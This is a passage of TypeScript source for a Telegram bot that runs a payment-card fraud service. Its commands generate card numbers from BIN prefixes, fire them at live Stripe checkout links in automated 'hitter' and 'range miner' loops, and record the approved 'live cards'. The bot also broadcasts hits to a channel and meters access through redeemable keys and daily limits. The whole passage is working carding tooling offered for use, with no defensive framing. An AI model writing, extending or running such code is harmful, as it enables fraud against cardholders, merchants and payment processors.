━━━━━━━━━━━━━━━━━━━━
Tried: *${cfg.totalTried}* | ✅ *${cfg.totalApproved}* | Rate: ${rate}%
━━━━━━━━━━━━━━━━━━━━
/mine start|stop|range|bin|month|year|type|gate|delay|noti`;
    }

    bot.onText(/^\/mine(?:@\w+)?(?:\s+(.+))?\s*$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("mine")) { bot?.sendMessage(chatId, "🚫 Range miner is disabled by the owner."); return; }
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const args   = (match?.[1]?.trim() || "").split(/\s+/);
      const action = args[0]?.toLowerCase() || "";
      const cfg    = loadMineConfig();

      if (!action || action === "status") {
        bot?.sendMessage(chatId, formatMineStatus(cfg), { parse_mode: "Markdown" });
        return;
      }

      // /mine start
      if (action === "start") {
        if (!cfg.startBin || !cfg.endBin) {
          bot?.sendMessage(chatId, "❌ Set a BIN range first:\n`/mine range 400000 400010`", { parse_mode: "Markdown" });
          return;
        }
        if (isRangeMinerRunning()) {
          bot?.sendMessage(chatId, "⚠️ Range miner already running. Use `/mine stop` first.", { parse_mode: "Markdown" });
          return;
        }
        cfg.isRunning = true;
        cfg.totalTried = 0;
        cfg.totalApproved = 0;
        saveMineConfig(cfg);

        const minerCfg: RangeMinerConfig = {
          startBin: cfg.startBin, endBin: cfg.endBin, extraBins: cfg.extraBins,
          month: cfg.month, year: cfg.year, typeFilter: cfg.typeFilter,
          gateId: cfg.gateId, delaySecs: cfg.delaySecs, maxCardsPerBin: cfg.maxCardsPerBin,
          notifyEnabled: cfg.notifyEnabled,
        };

        const result = await startRangeMiner(minerCfg, (card, hitResult, gateName, gateId) => {
          notifyLiveCardToChannel(card, hitResult, gateName, "range-miner", gateId);
        });

        if (!result.ok) {
          cfg.isRunning = false;
          saveMineConfig(cfg);
          const msgs: Record<string, string> = {
            already_running: "⚠️ Miner already running.",
            gate_not_found:  "❌ Gate not found. Use `/mine gate GATE_ID` or `/mine gate random`.",
            gate_inactive:   "❌ Selected gate is inactive.",
            no_bins:         "❌ No BINs. Use `/mine range START END`.",
          };
          bot?.sendMessage(chatId, msgs[result.reason ?? ""] ?? `❌ Cannot start: ${result.reason}`, { parse_mode: "Markdown" });
        } else {
          bot?.sendMessage(chatId, formatMineStatus(cfg), { parse_mode: "Markdown" });
        }
        return;
      }

      // /mine stop
      if (action === "stop") {
        await stopRangeMiner();
        cfg.isRunning = false;
        saveMineConfig(cfg);
        bot?.sendMessage(chatId, "🛑 *Range miner stopped.*", { parse_mode: "Markdown" });
        return;
      }

      // /mine range START END
      if (action === "range") {
        const start = (args[1] || "").replace(/\D/g, "");
        const end   = (args[2] || "").replace(/\D/g, "");
        if (!start || !end) {
          bot?.sendMessage(chatId,
`Usage: \`/mine range START END\`
\`/mine range 400000 400010\`
\`/mine range 411111 411111\`
BINs: 4 to 16 digits each | Max 500 BINs`, { parse_mode: "Markdown" });
          return;
        }
        if (start.length < 4 || start.length > 16 || end.length < 4 || end.length > 16) {
          bot?.sendMessage(chatId, "❌ BIN must be 4 to 16 digits.");
          return;
        }
        if (parseInt(start, 10) > parseInt(end, 10)) {
          bot?.sendMessage(chatId, "❌ Start BIN must be <= end BIN.");
          return;
        }
        const maxLen = Math.max(start.length, end.length);
        const sNum = parseInt(start.padEnd(maxLen, "0"), 10);
        const eNum = parseInt(end.padEnd(maxLen, "0"), 10);
        if (eNum - sNum + 1 > 500) {
          bot?.sendMessage(chatId, "❌ Range too large (max 500 BINs).");
          return;
        }
        cfg.startBin = start;
        cfg.endBin = end;
        saveMineConfig(cfg);
        bot?.sendMessage(chatId, `✅ BIN range set: \`${start}\` → \`${end}\``, { parse_mode: "Markdown" });
        return;
      }

      // /mine bin add|remove|list|clear
      if (action === "bin") {
        const sub = args[1]?.toLowerCase() || "list";
        if (sub === "add") {
          const bin = (args[2] || "").replace(/\D/g, "");
          if (bin.length < 4 || bin.length > 16) { bot?.sendMessage(chatId, "❌ BIN must be 4 to 16 digits."); return; }
          if (cfg.extraBins.includes(bin)) { bot?.sendMessage(chatId, `⚠️ BIN \`${bin}\` already in list.`, { parse_mode: "Markdown" }); return; }
          cfg.extraBins.push(bin);
          saveMineConfig(cfg);
          bot?.sendMessage(chatId, `✅ BIN \`${bin}\` added. Extra: ${cfg.extraBins.length}`, { parse_mode: "Markdown" });
          return;
        }
        if (sub === "remove") {
          const bin = (args[2] || "").replace(/\D/g, "");
          const before = cfg.extraBins.length;
          cfg.extraBins = cfg.extraBins.filter(b => b !== bin);
          saveMineConfig(cfg);
          bot?.sendMessage(chatId, cfg.extraBins.length < before
            ? `✅ BIN \`${bin}\` removed. Extra: ${cfg.extraBins.length}`
            : `⚠️ BIN \`${bin}\` not found.`, { parse_mode: "Markdown" });
          return;
        }
        if (sub === "clear") { cfg.extraBins = []; saveMineConfig(cfg); bot?.sendMessage(chatId, "✅ Extra BINs cleared."); return; }
        bot?.sendMessage(chatId,
`📦 *Extra BINs* (${cfg.extraBins.length})
${cfg.extraBins.length > 0 ? cfg.extraBins.map((b, i) => `${i+1}. \`${b}\``).join("\n") : "None"}
\`/mine bin add BIN\` | \`remove BIN\` | \`clear\``, { parse_mode: "Markdown" });
        return;
      }

      // /mine month MM|random
      if (action === "month") {
        const val = (args[1] || "").toLowerCase();
        if (val === "random" || val === "rand") { cfg.month = "random"; saveMineConfig(cfg); bot?.sendMessage(chatId, "✅ Month set to *random*.", { parse_mode: "Markdown" }); return; }
        const m = parseInt(val, 10);
        if (isNaN(m) || m < 1 || m > 12) { bot?.sendMessage(chatId, "❌ Month must be 1-12 or `random`.", { parse_mode: "Markdown" }); return; }
        cfg.month = String(m).padStart(2, "0");
        saveMineConfig(cfg);
        bot?.sendMessage(chatId, `✅ Month set to \`${cfg.month}\`.`, { parse_mode: "Markdown" });
        return;
      }

      // /mine year YYYY|random
      if (action === "year") {
        const val = (args[1] || "").toLowerCase();
        if (val === "random" || val === "rand") { cfg.year = "random"; saveMineConfig(cfg); bot?.sendMessage(chatId, "✅ Year set to *random*.", { parse_mode: "Markdown" }); return; }
        let y = parseInt(val, 10);
        if (isNaN(y)) { bot?.sendMessage(chatId, "❌ Invalid year."); return; }
        if (y < 100) y += 2000;
        if (y < 2024 || y > 2030) { bot?.sendMessage(chatId, "❌ Year must be 2024-2030 or `random`.", { parse_mode: "Markdown" }); return; }
        cfg.year = String(y);
        saveMineConfig(cfg);
        bot?.sendMessage(chatId, `✅ Year set to \`${cfg.year}\`.`, { parse_mode: "Markdown" });
        return;
      }

      // /mine type credit|prepaid|debit|all
      if (action === "type") {
        const val = (args[1] || "").toLowerCase();
        const valid = ["all", "credit", "prepaid", "debit"];
        if (!valid.includes(val)) { bot?.sendMessage(chatId, "Usage: `/mine type credit|prepaid|debit|all`", { parse_mode: "Markdown" }); return; }
        cfg.typeFilter = val as any;
        saveMineConfig(cfg);
        bot?.sendMessage(chatId, `✅ Card type filter: *${val.toUpperCase()}*`, { parse_mode: "Markdown" });
        return;
      }

      // /mine gate GATE_ID|random
      if (action === "gate") {
        if (!args[1]) {
          const allGates = await storage.getGateConfigs();
          const active = allGates.filter(g => g.active);
          const list = active.slice(0, 10).map(g => `\`${g.id.substring(0, 8)}\` — ${g.name} (${g.gateType})`).join("\n");
          bot?.sendMessage(chatId,
`⛏️ *Active Gates*
${list || "No active gates"}
\`/mine gate GATE_ID\` — select
\`/mine gate random\` — random`, { parse_mode: "Markdown" });
          return;
        }
        const gateArg = args[1].toLowerCase();
        if (gateArg === "random") { cfg.gateId = "random"; saveMineConfig(cfg); bot?.sendMessage(chatId, "✅ Gate set to *random*.", { parse_mode: "Markdown" }); return; }
        const allGates = await storage.getGateConfigs();
        const gate = allGates.find(g => g.id === gateArg || g.id.startsWith(gateArg));
        if (!gate) { bot?.sendMessage(chatId, `❌ Gate not found: \`${gateArg.substring(0, 20)}\``, { parse_mode: "Markdown" }); return; }
        cfg.gateId = gate.id;
        saveMineConfig(cfg);
        bot?.sendMessage(chatId, `✅ Gate set to *${gate.name}*`, { parse_mode: "Markdown" });
        return;
      }

      // /mine delay N
      if (action === "delay") {
        const secs = parseInt(args[1] || "3", 10);
        if (isNaN(secs) || secs < 1 || secs > 60) { bot?.sendMessage(chatId, "❌ Delay must be 1-60 seconds."); return; }
        cfg.delaySecs = secs;
        saveMineConfig(cfg);
        bot?.sendMessage(chatId, `✅ Delay set to *${secs}s*.`, { parse_mode: "Markdown" });
        return;
      }

      // /mine noti on|off
      if (action === "noti") {
        const val = args[1]?.toLowerCase();
        if (val !== "on" && val !== "off") { bot?.sendMessage(chatId, "Usage: `/mine noti on|off`", { parse_mode: "Markdown" }); return; }
        cfg.notifyEnabled = val === "on";
        saveMineConfig(cfg);
        bot?.sendMessage(chatId, `🔔 Notifications: *${val === "on" ? "ON" : "OFF"}*`, { parse_mode: "Markdown" });
        return;
      }

      // /mine maxbin N
      if (action === "maxbin") {
        const n = parseInt(args[1] || "50", 10);
        if (isNaN(n) || n < 1 || n > 500) { bot?.sendMessage(chatId, "❌ Max cards per BIN must be 1-500."); return; }
        cfg.maxCardsPerBin = n;
        saveMineConfig(cfg);
        bot?.sendMessage(chatId, `✅ Max cards per BIN set to *${n}*.`, { parse_mode: "Markdown" });
        return;
      }

      // /mine help
      bot?.sendMessage(chatId,
`⛏️ *Range Miner Commands*
━━━━━━━━━━━━━━━━━━━━
/mine — Status
/mine start — Start mining
/mine stop — Stop mining
/mine range START END — Set BIN range
/mine bin add|remove|list|clear — Extra BINs
/mine month MM|random — Expiry month
/mine year YYYY|random — Expiry year
/mine type credit|prepaid|debit|all — Card type
/mine gate ID|random — Select gate
/mine delay N — Delay (1-60s)
/mine noti on|off — Notifications
/mine maxbin N — Max cards/BIN (1-500)`, { parse_mode: "Markdown" });
    });

    // ─── /lives — Recent approved cards (admin) ───────────────────────────────
    bot.onText(/\/lives(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const arg = (match?.[1] ?? "today").trim().toLowerCase();
      const period: "today" | "24h" | "week" = arg === "24h" ? "24h" : arg === "week" ? "week" : "today";
      const periodLabel = period === "today" ? "Today" : period === "24h" ? "Last 24h" : "Last 7 Days";

      const cards = await storage.getApprovedByPeriod(period);
      if (cards.length === 0) {
        bot?.sendMessage(chatId, `📭 No approved cards found for *${periodLabel}*.`, { parse_mode: "Markdown" });
        return;
      }

      const preview = cards.slice(0, 15);
      const lines = preview.map((r, i) => {
        const gate = (r.gate ?? "?").substring(0, 18);
        const age  = timeAgo(r.createdAt);
        return `${i + 1}. \`${r.card}\` — ${gate} — ${age}`;
      });

      let out = `🏆 *LIVE CARDS [${periodLabel}]*\n━━━━━━━━━━━━━━━━━━━━\n`;
      out += lines.join("\n");
      if (cards.length > 15) out += `\n... and *${cards.length - 15}* more`;
      out += `\n━━━━━━━━━━━━━━━━━━━━\nTotal: *${cards.length}* | /download for full file`;
      bot?.sendMessage(chatId, out, { parse_mode: "Markdown" });
    });

    // ─── /livecount — Approval stats by gate (admin) ──────────────────────────
    bot.onText(/\/livecount/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const [byGate, todayCards, weekCards, allCards] = await Promise.all([
        storage.getLiveCountByGate(),
        storage.getApprovedByPeriod("today"),
        storage.getApprovedByPeriod("week"),
        storage.getApprovedCards(),
      ]);

      const medals = ["🥇", "🥈", "🥉"];
      const gateLines = byGate.slice(0, 10).map((g, i) =>
        `${medals[i] ?? "🔹"} *${g.gate}*: ${g.today} today | ${g.week} week | ${g.total} total`,
      );

      const out =
`📊 *APPROVAL STATS*
━━━━━━━━━━━━━━━━━━━━
Today: *${todayCards.length}* | This Week: *${weekCards.length}* | All Time: *${allCards.length}*
━━━━━━━━━━━━━━━━━━━━
*By Gate:*
${gateLines.length > 0 ? gateLines.join("\n") : "No data yet"}
━━━━━━━━━━━━━━━━━━━━`;

      bot?.sendMessage(chatId, out, { parse_mode: "Markdown" });
    });

    // ─── /clearresults — Wipe old check results (admin) ───────────────────────
    bot.onText(/\/clearresults(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const arg = match?.[1]?.trim().toLowerCase();
      if (!arg) {
        bot?.sendMessage(chatId,
`🗑️ *Clear Check Results*
━━━━━━━━━━━━━━━━━━━━
Choose what to clear:`, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🗑️ Older than 7 days",  callback_data: "clearresults_7"   }],
              [{ text: "🗑️ Older than 30 days", callback_data: "clearresults_30"  }],
              [{ text: "🗑️ Older than 90 days", callback_data: "clearresults_90"  }],
              [{ text: "💥 Clear ALL results",  callback_data: "clearresults_all" }],
              [{ text: "❌ Cancel",              callback_data: "clearresults_cancel" }],
            ],
          },
        });
        return;
      }

      if (arg === "all") {
        await storage.clearAllCheckResults();
        bot?.sendMessage(chatId, "✅ All check results cleared.");
      } else {
        const days = parseInt(arg, 10);
        if (isNaN(days) || days < 1) {
          bot?.sendMessage(chatId, "❌ Usage: `/clearresults [7|30|90|all]`", { parse_mode: "Markdown" });
          return;
        }
        const count = await storage.clearResultsOlderThan(days);
        bot?.sendMessage(chatId, `✅ Cleared *${count}* results older than *${days}* days.`, { parse_mode: "Markdown" });
      }
    });

    // ─── /autohit — Auto-hitter loop (admin) ──────────────────────────────────
    bot.onText(/\/autohit(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("autohit")) { bot?.sendMessage(chatId, "🚫 /autohit is disabled by the owner."); return; }
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }
      if (!botUser) {
        bot?.sendMessage(chatId, "❌ User record not found. Use /start first.");
        return;
      }

      const freshSettings = await storage.getBotSettings();
      if (!(freshSettings as any).hitterEnabled) {
        bot?.sendMessage(chatId, "⛔ Hitter is disabled in bot settings.");
        return;
      }

      const tokens = (match?.[1]?.trim() || "").split(/\s+/);
      const action = tokens[0]?.toLowerCase();

      if (action === "off") {
        const job = autoHitJobs.get(telegramId);
        if (!job) {
          bot?.sendMessage(chatId, "ℹ️ No auto-hitter is running.");
        } else {
          job.stop();
          autoHitJobs.delete(telegramId);
          bot?.sendMessage(chatId, "🛑 Auto-hitter stopped.");
        }
        return;
      }

      if (action === "status") {
        const running = autoHitJobs.has(telegramId);
        bot?.sendMessage(chatId,
          running
            ? "⚡ Auto-hitter is *running*. Use `/autohit off` to stop."
            : "💤 No auto-hitter running. Use `/autohit on URL BIN [delay]` to start.",
          { parse_mode: "Markdown" });
        return;
      }

      if (action !== "on") {
        bot?.sendMessage(chatId,
`⚡ *Auto-Hitter Usage*
\`/autohit on URL BIN [delay_secs]\`
\`/autohit off\`
\`/autohit status\`

• *URL* — Stripe checkout link
• *BIN* — 6+ digit BIN
• *delay\\_secs* — seconds between cards (default: 3)

Example:
\`/autohit on https://checkout.stripe.com/c/pay/xxx 411111 3\``, { parse_mode: "Markdown" });
        return;
      }

      if (tokens.length < 3) {
        bot?.sendMessage(chatId, "❌ Usage: `/autohit on URL BIN [delay_secs]`", { parse_mode: "Markdown" });
        return;
      }

      if (autoHitJobs.has(telegramId)) {
        bot?.sendMessage(chatId, "⚠️ Auto-hitter already running. Use `/autohit off` first.", { parse_mode: "Markdown" });
        return;
      }

      const checkoutUrl = tokens[1];
      const bin         = tokens[2].replace(/\D/g, "");
      const delaySecs   = Math.max(1, Math.min(60, parseInt(tokens[3] || "3", 10)));
      const delayMs     = delaySecs * 1000;

      if (bin.length < 6) {
        bot?.sendMessage(chatId, "❌ BIN must be at least 6 digits.");
        return;
      }

      bot?.sendMessage(chatId, `⏳ *Parsing checkout link...*`, { parse_mode: "Markdown" });
      let sessionData: CheckoutSessionData;
      try {
        sessionData = await parseCheckoutLink(checkoutUrl);
        if (!sessionData?.publishableKey) {
          bot?.sendMessage(chatId, "❌ Could not parse checkout session.");
          return;
        }
      } catch (err: any) {
        bot?.sendMessage(chatId, `❌ Parse failed: ${err.message?.substring(0, 100)}`);
        return;
      }

      const amountStr = sessionData.amount != null ? `$${sessionData.amount}` : "?";
      const currency  = (sessionData.currency ?? "usd").toUpperCase();
      const merchant  = sessionData.merchantName || "Unknown";

      bot?.sendMessage(chatId,
`🤖 *Auto-Hitter Started*
━━━━━━━━━━━━━━━━━━━━
*BIN:* \`${bin}\`
*Amount:* ${amountStr} ${currency}
*Merchant:* ${merchant}
*Delay:* ${delaySecs}s between cards
━━━━━━━━━━━━━━━━━━━━
Running... Use \`/autohit off\` to stop.`, { parse_mode: "Markdown" });

      const jobRef = { running: true };
      autoHitJobs.set(telegramId, { stop: () => { jobRef.running = false; } });

      (async () => {
        let totalTried = 0, totalApproved = 0, totalDeclined = 0, totalErrors = 0;

        while (jobRef.running) {
          const batch = generateCards(bin, 5);

          for (const gen of batch) {
            if (!jobRef.running) break;

            const cardFull = `${gen.number}|${gen.expiryMonth}|${gen.expiryYear}|${gen.cvv}`;
            let hitResult: any;
            try {
              hitResult = await hitCheckoutWithCard(sessionData, cardFull, 0, false);
            } catch (err: any) {
              totalErrors++; totalTried++;
              if (totalErrors >= 5) {
                jobRef.running = false;
                autoHitJobs.delete(telegramId);
                bot?.sendMessage(chatId,
`⚠️ *Auto-Hitter Stopped — Too Many Errors*
Tried: ${totalTried} | ✅ ${totalApproved} | ❌ ${totalDeclined}
Last error: ${(err as any).message?.substring(0, 80)}`, { parse_mode: "Markdown" });
                return;
              }
              continue;
            }

            totalTried++;
            const isSuccess = hitResult.status === "success" || hitResult.status === "approved";
            const isDead    = hitResult.status === "declined";

            if (isSuccess) {
              totalApproved++;
              totalErrors = 0;
              const latStr = hitResult.latency >= 1000 ? `${(hitResult.latency / 1000).toFixed(1)}s` : `${hitResult.latency}ms`;
              bot?.sendMessage(chatId,
`✅ *APPROVED! #${totalApproved}*
━━━━━━━━━━━━━━━━━━━━
*Card:* \`${isMaskEnabled() ? maskCardLine(cardFull) : cardFull}\`
*Result:* ${hitResult.response?.split("|")[0]?.trim() || "Approved"}
*Latency:* ${latStr} | *Tried:* ${totalTried}
━━━━━━━━━━━━━━━━━━━━`, { parse_mode: "Markdown" });

              await storage.createCheckResult({
                card: cardFull, status: "approved",
                response: hitResult.response || "", gate: "AutoHitter",
                latency: hitResult.latency, checkedBy: telegramId,
              });
              notifyLiveCardToChannel(cardFull, {
                status: "approved", response: hitResult.response || "AutoHit Approved",
                latency: hitResult.latency,
              }, "AutoHitter", telegramId);

            } else if (isDead) {
              totalDeclined++;
              totalErrors = 0;
              await storage.createCheckResult({
                card: cardFull, status: "declined",
                response: hitResult.response || "", gate: "AutoHitter",
                latency: hitResult.latency, checkedBy: telegramId,
              });
            } else {
              totalErrors++;
            }

            if (totalTried % 10 === 0) {
              bot?.sendMessage(chatId,
`⏳ *AutoHit Progress* [${totalTried} tried]
✅ ${totalApproved} | ❌ ${totalDeclined} | ⚠️ ${totalErrors}
Use \`/autohit off\` to stop.`, { parse_mode: "Markdown" });
            }

            if (jobRef.running) await new Promise(r => setTimeout(r, delayMs));
          }
        }

        await storage.updateBotUser(botUser.id, {
          usageToday: (botUser.usageToday ?? 0) + totalTried,
          totalChecks: (botUser.totalChecks ?? 0) + totalTried,
          totalHits: (botUser.totalHits ?? 0) + totalApproved,
        });
        autoHitJobs.delete(telegramId);
        bot?.sendMessage(chatId,
`🛑 *Auto-Hitter Stopped*
━━━━━━━━━━━━━━━━━━━━
*Total Tried:* ${totalTried}
✅ Approved: ${totalApproved}
❌ Declined: ${totalDeclined}
⚠️ Errors: ${totalErrors}
━━━━━━━━━━━━━━━━━━━━`, { parse_mode: "Markdown" });
      })().catch(err => {
        log(`[AUTOHIT ERROR] ${err.message}`, "telegram");
        autoHitJobs.delete(telegramId);
        bot?.sendMessage(chatId, `⚠️ Auto-hitter crashed: ${err.message?.substring(0, 100)}`);
      });
    });

    // ─── /watch — Subscribe to gate live DMs (admin) ──────────────────────────
    bot.onText(/\/watch(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("watch")) { bot?.sendMessage(chatId, "🚫 /watch is disabled by the owner."); return; }
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const arg = match?.[1]?.trim() || "";

      if (!arg || arg === "list") {
        const watched = adminWatchedGates.get(telegramId);
        if (!watched || watched.size === 0) {
          const allGates = await storage.getGateConfigs();
          const activeOnes = allGates.filter(g => g.active).slice(0, 10);
          const gateList = activeOnes.map(g => `\`${g.id.substring(0, 8)}\` — ${g.name}`).join("\n");
          bot?.sendMessage(chatId,
`👁 *Gate Watch — Not subscribed*
━━━━━━━━━━━━━━━━━━━━
You'll receive DMs when a watched gate gets an approval.

*Active gates:*
${gateList || "No active gates"}
━━━━━━━━━━━━━━━━━━━━
\`/watch GATE_ID\` — subscribe
\`/watch off\` — clear all`, { parse_mode: "Markdown" });
        } else {
          const allGates = await storage.getGateConfigs();
          const names = [...watched].map(id => {
            const g = allGates.find(x => x.id === id);
            return g ? `• ${g.name}` : `• [deleted: ${id.substring(0, 8)}]`;
          }).join("\n");
          bot?.sendMessage(chatId,
`👁 *Watching ${watched.size} gate(s)*
━━━━━━━━━━━━━━━━━━━━
${names}
━━━━━━━━━━━━━━━━━━━━
\`/watch off\` — clear all
\`/watch off GATE_ID\` — remove one`, { parse_mode: "Markdown" });
        }
        return;
      }

      if (arg === "off") {
        adminWatchedGates.delete(telegramId);
        bot?.sendMessage(chatId, "👁 All gate watches cleared.");
        return;
      }

      if (arg.startsWith("off ")) {
        const gateId = arg.substring(4).trim();
        const watched = adminWatchedGates.get(telegramId);
        if (watched) {
          watched.delete(gateId);
          if (watched.size === 0) adminWatchedGates.delete(telegramId);
        }
        bot?.sendMessage(chatId, `👁 Removed watch for \`${gateId.substring(0, 20)}\`.`, { parse_mode: "Markdown" });
        return;
      }

      // Add watch by gate ID (or prefix match)
      const allGates = await storage.getGateConfigs();
      const gate = allGates.find(g => g.id === arg || g.id.startsWith(arg));
      if (!gate) {
        bot?.sendMessage(chatId,
`❌ Gate not found: \`${arg.substring(0, 20)}\`
Use \`/watch\` to list active gate IDs.`, { parse_mode: "Markdown" });
        return;
      }

      if (!adminWatchedGates.has(telegramId)) adminWatchedGates.set(telegramId, new Set());
      adminWatchedGates.get(telegramId)!.add(gate.id);
      bot?.sendMessage(chatId,
`👁 *Now watching:* ${gate.name}
You'll get a DM on every approval from this gate.
Use \`/watch list\` to see all subscriptions.`, { parse_mode: "Markdown" });
    });

    // ─── /hit — Checkout Hitter (redeemed users only) ─────────────────────────
    // Usage: /hit <checkout_url> <BIN> [count]
    // Generates `count` cards (default 10, max maxGenPerRequest) from the BIN
    // and hits them sequentially against the Stripe checkout link.
    // Stops on first approval. Reports live progress.
    bot.onText(/\/hit(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("hit")) { bot?.sendMessage(chatId, "🚫 /hit is disabled by the owner."); return; }

      const botUser = await storage.getBotUser(telegramId);
      if (!botUser) { bot?.sendMessage(chatId, "❌ Not registered. Send /start first."); return; }
      if (botUser.banned) { bot?.sendMessage(chatId, "🚫 Account banned."); return; }

      const freshSettings = await storage.getBotSettings();
      if (!(freshSettings as any).hitterEnabled) {
        bot?.sendMessage(chatId, "⛔ Hitter command is currently disabled by admin.");
        return;
      }

      const hasAdminAccess = await checkAdmin(telegramId, botUser);
      if (!hasAdminAccess && !botUser.keyId) {
        bot?.sendMessage(chatId, "🔑 Redeem an access key first: `/redeem KEY`", { parse_mode: "Markdown" });
        return;
      }
      if (!hasAdminAccess && botUser.keyId) {
        const key = await storage.getAccessKeyById(botUser.keyId);
        if (key && key.expiresAt && new Date(key.expiresAt) < new Date()) {
          bot?.sendMessage(chatId, "⚠️ Your access key has expired. Redeem a new one: `/redeem KEY`", { parse_mode: "Markdown" });
          return;
        }
      }

      const input = match?.[1]?.trim() || "";
      // Parse: /hit <URL> <BIN> [count]
      const tokens = input.split(/\s+/);
      if (tokens.length < 2) {
        bot?.sendMessage(chatId,
`⚡ *Hitter Usage*
\`/hit URL BIN [count]\`

• *URL* — Stripe checkout link (\`checkout.stripe.com/...\`)
• *BIN* — 6–9 digit BIN to generate cards from
• *count* — cards to try (default: 10)

Example:
\`/hit https://checkout.stripe.com/c/pay/cs_live_xxx 411111 10\``, { parse_mode: "Markdown" });
        return;
      }

      const checkoutUrl = tokens[0];
      const bin         = tokens[1].replace(/\D/g, "");
      const rawCount    = tokens[2] ? parseInt(tokens[2], 10) : 10;

      if (bin.length < 6) {
        bot?.sendMessage(chatId, "❌ BIN must be at least 6 digits.");
        return;
      }

      const maxGen = (freshSettings as any).maxGenPerRequest || 50;
      const count  = Math.max(1, Math.min(isNaN(rawCount) ? 10 : rawCount, maxGen));

      // Daily limit check — charge the whole batch upfront
      const dailyLimit = botUser.dailyLimit ?? freshSettings.defaultDailyLimit ?? 1000;
      const used       = botUser.usageToday ?? 0;
      const remaining  = dailyLimit - used;
      if (!hasAdminAccess && remaining < count) {
        bot?.sendMessage(chatId,
`⚠️ *Daily limit reached*
You need *${count}* checks but only *${remaining}* remain today (limit: ${dailyLimit}).
Reduce count or wait for reset.`, { parse_mode: "Markdown" });
        return;
      }

      // Parse checkout link once
      bot?.sendMessage(chatId, `⏳ *Parsing checkout link...*`, { parse_mode: "Markdown" });

      let sessionData: CheckoutSessionData;
      try {
        sessionData = await parseCheckoutLink(checkoutUrl);
        if (!sessionData?.publishableKey) {
          bot?.sendMessage(chatId, "❌ Could not parse checkout session. Make sure it's a valid Stripe checkout link.");
          return;
        }
      } catch (err: any) {
        log(`[HIT ERROR] parseCheckoutLink: ${err.message}`, "telegram");
        bot?.sendMessage(chatId, `❌ Failed to parse checkout: ${err.message?.substring(0, 100) || "Unknown error"}`);
        return;
      }

      // Generate cards from BIN
      const generatedCards = generateCards(bin, count);
      const amountStr  = sessionData.amount != null ? `$${sessionData.amount}` : "?";
      const currency   = (sessionData.currency ?? "usd").toUpperCase();
      const merchant   = sessionData.merchantName || "Unknown";

      // Send start banner
      bot?.sendMessage(chatId,
`⚡ *Checkout Hitter Started*
━━━━━━━━━━━━━━━━━━━━
*BIN:* \`${bin}\`
*Cards:* ${count} generated
*Amount:* ${amountStr} ${currency}
*Merchant:* ${merchant}
━━━━━━━━━━━━━━━━━━━━
Hitting...`, { parse_mode: "Markdown" });

      let approved = 0;
      let declined = 0;
      let errors   = 0;
      let approvedCard: string | null = null;
      let approvedResult: any = null;
      const progressEvery = Math.max(1, Math.floor(count / 5)); // send progress ~5 times

      for (let i = 0; i < generatedCards.length; i++) {
        const gen  = generatedCards[i];
        const cardFull = `${gen.number}|${gen.expiryMonth}|${gen.expiryYear}|${gen.cvv}`;

        let hitResult: any;
        try {
          hitResult = await hitCheckoutWithCard(sessionData, cardFull, 0, false);
        } catch (err: any) {
          errors++;
          log(`[HIT ERROR] card ${i + 1}: ${err.message}`, "telegram");
          continue;
        }

        const isSuccess = hitResult.status === "success" || hitResult.status === "approved";
        const isDead    = hitResult.status === "declined";

        if (isSuccess) {
          approved++;
          approvedCard   = cardFull;
          approvedResult = hitResult;
        } else if (isDead) {
          declined++;
        } else {
          errors++;
        }

        // Log each card result
        await storage.createCheckResult({
          card: cardFull,
          status: isSuccess ? "approved" : isDead ? "declined" : "error",
          response: hitResult.response || "",
          gate: "Hitter",
          latency: hitResult.latency,
          checkedBy: telegramId,
        });

        // Progress update
        if ((i + 1) % progressEvery === 0 && i + 1 < generatedCards.length && !isSuccess) {
          const bar = buildProgressBar(i + 1, count);
          bot?.sendMessage(chatId,
`⏳ *Progress* [${i + 1}/${count}]
${bar}
✅ ${approved} | ❌ ${declined} | ⚠️ ${errors}`, { parse_mode: "Markdown" });
        }

        // Stop on first approval
        if (isSuccess) {
          break;
        }
      }

      // Update user stats (charge for actual tries)
      const triedCount = approved + declined + errors;
      await storage.updateBotUser(botUser.id, {
        usageToday: (botUser.usageToday ?? 0) + triedCount,
        totalChecks: (botUser.totalChecks ?? 0) + triedCount,
        totalHits: (botUser.totalHits ?? 0) + approved,
      });

      // Final result
      if (approved > 0 && approvedCard && approvedResult) {
        const latencyStr = approvedResult.latency >= 1000
          ? `${(approvedResult.latency / 1000).toFixed(1)}s`
          : `${approvedResult.latency}ms`;

        bot?.sendMessage(chatId,
`✅ *HIT APPROVED!*
━━━━━━━━━━━━━━━━━━━━
*Card:* \`${isMaskEnabled() ? maskCardLine(approvedCard) : approvedCard}\`
*Result:* ${approvedResult.response?.split("|")[0]?.trim() || "Approved"}
*Amount:* ${amountStr} ${currency}
*Merchant:* ${merchant}
